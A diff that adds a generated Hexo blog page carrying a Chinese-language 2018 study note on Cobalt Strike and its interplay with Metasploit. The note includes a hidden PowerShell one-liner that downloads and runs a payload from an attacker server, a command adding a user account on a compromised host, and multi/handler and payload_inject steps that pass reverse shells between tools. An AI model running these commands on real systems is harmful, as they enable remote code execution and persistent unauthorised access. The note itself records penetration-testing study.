@@ -1,39 +1,229 @@
-extends includes/layout
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+    <title>c1y2m3’blog</title>
+    <link rel="stylesheet" href="/c1y2m3.github.io/css/style.css">
+    <link rel="stylesheet" href="/c1y2m3.github.io/css/gitment.css">
+    <link rel="stylesheet" type="text/css" href="//at.alicdn.com/t/font_859455_eaq7v6w8ktj.css">
+</head>
+<body>
+<header class="header">
+    <div class="header-inner">
+        <div class="header-title">
 
-block content
+        </div>
+        <nav class="header-nav">
+            
+            <a href="/c1y2m3.github.io/" class="header-nav-link">
+                首页
+            </a>
+            
 
-    section#wrapper.post
-        article
-            header
-                h1!=page.title
-                h2.headline!=date(page.date, 'MMM DD, YYYY h:mm')
-                    |·
-                    |#{wordcount(page.content)} words
-                    |·
-                    |#{min2read(page.content)} minutes read
-                    span.tags
+            
+            <a href="/c1y2m3.github.io/archives" class="header-nav-link">
+                归档
+            </a>
+            
 
-            if toc(page.content)
-                div#toc!=toc(page.content,{list_number:false})
+            
+            <a href="/c1y2m3.github.io/tags" class="header-nav-link">
+                标签
+            </a>
+            
 
-            section#post-body!=page.content
+            
+        </nav>
+    </div>
+</header>
+<header class="mobile-header">
+    <div class="mobile-nav">
+        <div class="mobile-nav-icon">
+            <span></span>
+            <span></span>
+            <span></span>
+        </div>
+        <div class="mobile-nav-title">
+            <a href="/c1y2m3.github.io/" class="mobile-nav-title-link">John Doe's Blog</a>
+        </div>
 
-            - var prev = page.prev ? page.prev.path : false;
-            - var next = page.next ? page.next.path : false;
-            nav#post-nav
-                span.prev
-                    if page.prev
-                        a(href=url_for(prev))
-                            span.arrow ←
-                            | Newer Posts
-                span.next
-                    if page.next
-                        a(href=url_for(next))
-                            | Older Posts
-                            span.arrow →
+    </div>
+    <nav class="mobile-menu">
+        <ul class="mobile-menu-list">
+            <li class="mobile-menu-item">
+                <i class="iconfont icon-home"></i>
+                <a href="/c1y2m3.github.io/" class="mobile-nav-link">首页</a>
+            </li>
+            <li class="mobile-menu-item">
+                <i class="iconfont icon-archive"></i>
+                <a href="/c1y2m3.github.io/archives" class="mobile-nav-link">归档</a>
+            </li>
+            <li class="mobile-menu-item">
+                <i class="iconfont icon-tag"></i>
+                <a href="/c1y2m3.github.io/tags" class="mobile-nav-link">标签</a>
+            </li>
+            <li class="mobile-menu-item">
+                <i class="iconfont icon-about"></i>
+                <a href="/c1y2m3.github.io/about/" class="mobile-nav-link">关于</a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<div class="main">
+    <div class="content-inner">
+        <div class="posts">
+    <article class="post-whole">
+        <div class="post-title">
+            <h2 class="title">Cobalt Strike学习笔记</h2>
+            <div class="post-meta">
+                <span class="post-time">2018-09-29</span>
+                
+                <span class="post-visit"> 阅读次数：<span id="busuanzi_value_page_pv"></span></span>
+            </div>
+        </div>
+        <div class="post-toc" id="post-toc">
+    <strong class="post-toc-title">目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#0x01-安装与运行"><span class="toc-text">0x01 安装与运行</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#0x02-参数详情"><span class="toc-text">0x02 参数详情</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#0x03-基本运行"><span class="toc-text">0x03 基本运行</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#word宏-CHM制作-LNK-水坑攻击-待续！"><span class="toc-text">word宏 CHM制作 LNK 水坑攻击 待续！</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#右键-进入-Interact-进入交互模式"><span class="toc-text">右键 进入 Interact 进入交互模式</span></a></li></ol><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-与msf进行联动"><span class="toc-text">0x04 与msf进行联动</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#0x05-与cs进行联动"><span class="toc-text">0x05 与cs进行联动</span></a></li></ol>
+    <div class="back-to-top" id="back-to-top">
+        <a href="javascript:void(0);">回到顶部</a>
+    </div>
+</li></div>
+        <div class="post-content">
+            <p>　Cobalt Strike 一款以metasploit为基础的GUI的框架式渗透测试工具。
+　</p>
+<h5 id="0x01-安装与运行"><a href="#0x01-安装与运行" class="headerlink" title="0x01 安装与运行"></a>0x01 安装与运行</h5><p>Java环境，服务端运行在Linux系统上。</p>
+<p><code>sudo ./teamserver 172.28.100.188 root</code></p>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5baef5caea3b4a262af7be9b" alt=""></p>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5baef62fea3b4a262af7cbca" alt=""></p>
+<ul>
+<li><ul>
+<li></li>
+</ul>
+</li>
+</ul>
+<h5 id="0x02-参数详情"><a href="#0x02-参数详情" class="headerlink" title="0x02 参数详情"></a>0x02 参数详情</h5><ol>
+<li><code>View =&gt; Credentials</code><br>通过hashdump或者Mimikatz抓取过的密码都会储存在这里。<br><code>Web log =&gt; #显示web访问记录</code></li>
+<li>Packages  #攻击包<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTML Application   生成恶意的HTA木马文件</span><br><span class="line">MS Office Macro   生成office宏病毒文件</span><br><span class="line">Payload Generator   生成各种语言版本的payload</span><br><span class="line">USB/CD AutoPlay   生成利用自动播放运行的木马文件</span><br><span class="line">Windows Dropper   捆绑器，能够对文档类进行捆绑</span><br><span class="line">Windows Executable   生成可执行exe木马</span><br><span class="line">Windows Executable(S)  生成无状态的可执行exe木马</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<ul>
+<li><ul>
+<li></li>
+</ul>
+</li>
+</ul>
+<h5 id="0x03-基本运行"><a href="#0x03-基本运行" class="headerlink" title="0x03 基本运行"></a>0x03 基本运行</h5><p>首先创建一个Listener，点击cobalt strike -&gt;Listeners -&gt; Add</p>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5baefa1550f8dd17df72d58e" alt=""></p>
+<p><code>powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http://172.28.100.188:81/a&#39;))&quot;</code></p>
+<h5 id="word宏-CHM制作-LNK-水坑攻击-待续！"><a href="#word宏-CHM制作-LNK-水坑攻击-待续！" class="headerlink" title="word宏 CHM制作 LNK 水坑攻击 待续！"></a>word宏 CHM制作 LNK 水坑攻击 待续！</h5><ul>
+<li><ul>
+<li></li>
+</ul>
+</li>
+</ul>
+<h5 id="右键-进入-Interact-进入交互模式"><a href="#右键-进入-Interact-进入交互模式" class="headerlink" title="右键 进入 Interact 进入交互模式"></a>右键 进入 Interact 进入交互模式</h5><p><img src="https://www.yunzhijia.com/microblog/filesvr/5baf105ddb5aa66c49adbcba" alt=""></p>
+<p><code>详情输入 Help</code> shell net user test test /add</p>
+<ul>
+<li><ul>
+<li><h3 id="0x04-与msf进行联动"><a href="#0x04-与msf进行联动" class="headerlink" title="0x04 与msf进行联动"></a>0x04 与msf进行联动</h3>权限维持：<br>当cs获取到一个上线机器，把这个机器丢给msf中meterpreter获取session</li>
+</ul>
+</li>
+</ul>
+<p><code>msf &gt; use exploit/multi/handler</code></p>
+<p><code>msf exploit(handler) &gt; set payload</code></p>
+<p><code>windows/meterpreter/reverse_tcp</code></p>
+<p><code>payload =&gt; windows/meterpreter/reverse_tcp</code></p>
+<p><code>msf exploit(handler) &gt; set lhost 192.168.3.72</code></p>
+<p><code>lhost =&gt; 192.168.3.72</code></p>
+<p><code>msf exploit(handler) &gt; set lport 5555</code></p>
+<p><code>lport =&gt; 5555</code></p>
+<p><code>msf exploit(handler) &gt; exploit -j</code></p>
+<ul>
+<li><ul>
+<li></li>
+</ul>
+</li>
+</ul>
+<p>之后Cobalt strike 创建一个windows/foreign/reverse_tcp Listener，其中ip为msf的ip地址，端口为msf监听的端口。</p>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5baeff52db5aa66c49ac9f40" alt=""></p>
+<p>然后选中计算机，右键-&gt;Spawn:选择刚刚创建的监听器：<br>可以看到目标主机的已上线，我们可以进行我们的操作了。</p>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5baf020bea3b4a262af8e6cf" alt=""></p>
+<ul>
+<li><ul>
+<li></li>
+</ul>
+</li>
+</ul>
+<h5 id="0x05-与cs进行联动"><a href="#0x05-与cs进行联动" class="headerlink" title="0x05 与cs进行联动"></a>0x05 与cs进行联动</h5><p>msf获得了一个meterpreter的session，想把session传给cs<br>在cs创建一个监听，host修改成cs客户端IP，监听6666端口。</p>
+<p>此时切我们换到meterpreter中，</p>
+<p><code>meterpreter &gt; background # 切换到后台</code></p>
+<p><code>msf exploit(handler) &gt; use</code></p>
+<p><code>exploit/windows/local/payload_inject</code></p>
+<p><code>这个exploit是注入一个新的payload 到当前的session里面</code></p>
+<p><code>msf exploit(payload_inject) &gt; set payload</code></p>
+<p><code>windows/meterpreter/reverse_http # 不能使用x64的payload</code></p>
+<p><code>msf exploit(payload_inject) &gt; set DisablePayloadHandler true</code><br><code>关闭msf payload的监听，可以不用设置，不影响效果</code></p>
+<p><code>msf exploit(payload_inject) &gt; set lhost 192.168.3.103</code></p>
+<p><code>msf exploit(payload_inject) &gt; set lport 6666 # 监听者的监听端口</code></p>
+<p><code>msf exploit(payload_inject) &gt; set session 1</code></p>
+<p><code>msf exploit(payload_inject) &gt; exploit</code></p>
+<p>根据上线的肉鸡，可以使用SOCKS代理</p>
 
-            include includes/comment.pug
+        </div>
+        
+    </article>
+</div>
+<div class="paginator">
+    
+        
+            <a class="prev" href="/c1y2m3.github.io/2018/10/07/关于前期信息收集笔记/">
+                <i class="iconfont icon-prev"></i>
+                <span class="nav-default">关于前期信息收集笔记</span>
+                <span class="nav-mobile">上一篇</span>
+            </a>
+        
+        
+            <a class="next" href="/c1y2m3.github.io/2018/09/26/ redis安全详解/">
+                <span class="nav-default">Redis学习详解</span>
+                <span class="nav-mobile">下一篇</span>
+                <i class="iconfont icon-next"></i>
+            </a>
+        
+    
+</div>
+<div id="comment-container"></div>
+    </div>
+</div>
+<footer class="footer-social">
+    
 
+    
 
+    
 
+    <div class="footer-copyright">
+        <p class="time-line">
+            &copy;
+            
+            
+            2019
+            &nbsp;<i class="iconfont icon-heart"></i>&nbsp;
+            <a target="_blank" href="https://github.com/iJinxin">John Doe</a>
+        </p>
+        <p class="theme-info">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme -
+            <a target="_blank" href="https://github.com/iJinxin/hexo-theme-sky">Sky</a>
+        </p>
+    </div>
+</footer>
+</body>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script src="/c1y2m3.github.io/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
+<script>
+    
 
+</script>
+</html>
